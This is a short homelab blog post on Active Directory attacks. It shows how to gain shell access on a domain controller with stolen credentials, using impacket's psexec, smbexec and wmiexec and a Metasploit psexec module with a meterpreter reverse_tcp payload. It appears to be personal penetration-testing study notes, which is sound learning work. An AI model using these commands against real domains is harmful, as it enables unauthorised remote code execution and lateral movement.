---
title: " Gaining Shell Access  "
layout: post
category: Active-Directory
tags: [AD, Windows-server]
excerpt: " "
---

# Gaining Shell Access 
** this done when you get credential (user and pass)**

## Using [impacket](https://github.com/SecureAuthCorp/impacket)
```bash
# psexec.py DC/Username:Password@DC-IP

psexec.py Homelab.local/superman:'Password123!'@192.168.1.2

```
![Desktop View](/assets/img/AD_Lab/1 (75).png){: }

```bash
# smbexec.py DC/Username:Password@DC-IP

smbexec.py Homelab.local/superman:'Password123!'@192.168.1.2

```
![Desktop View](/assets/img/AD_Lab/1 (76).png){: }

```bash
# wmiexec.py DC/Username:Password@DC-IP
wmiexec.py Homelab.local/superman:'Password123!'@192.168.1.2

```
![Desktop View](/assets/img/AD_Lab/1 (77).png){: }

## using Metasploit

```bash
use exploit/windows/smb/psexec  
set rhost #dc-ip
set smbdomain #dc-name
set smbpass  # Userpass
set smbuser  # Usarname
set Lhost  # local-ip
set payload /windows/x64/meterpreter/reverse_tcp   # payload
run # run exploit
```
![Desktop View](/assets/img/AD_Lab/1 (78).png){: }

![Desktop View](/assets/img/AD_Lab/1 (79).png){: }

- now we get shell access 
![Desktop View](/assets/img/AD_Lab/1 (80).png){: }
